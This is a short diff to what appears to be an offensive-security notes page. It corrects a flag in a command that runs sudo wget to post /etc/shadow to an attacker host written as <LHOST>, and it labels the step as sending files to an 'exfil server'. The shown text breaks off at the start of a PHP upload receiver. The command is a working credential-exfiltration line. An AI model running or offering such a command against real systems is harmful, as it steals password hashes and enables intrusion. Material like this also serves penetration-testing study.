@@ -23,7 +23,7 @@ Allows you to read any file (stderr to stdout for awk to get rid of errors that 
 <br/>
 Auxiliary fun stuff<br/>
 Just like with curl and olympus, we can use wget to post files to an exfil server<br/>
-sudo wget --port-file=/etc/shadow &lt;LHOST&gt;/upload.php?filename=shadow<br/>
+sudo wget --post-file=/etc/shadow &lt;LHOST&gt;/upload.php?filename=shadow<br/>
 <br/>
 upload.php script to handle the connections:<br/>
 &lt;?php <br/>
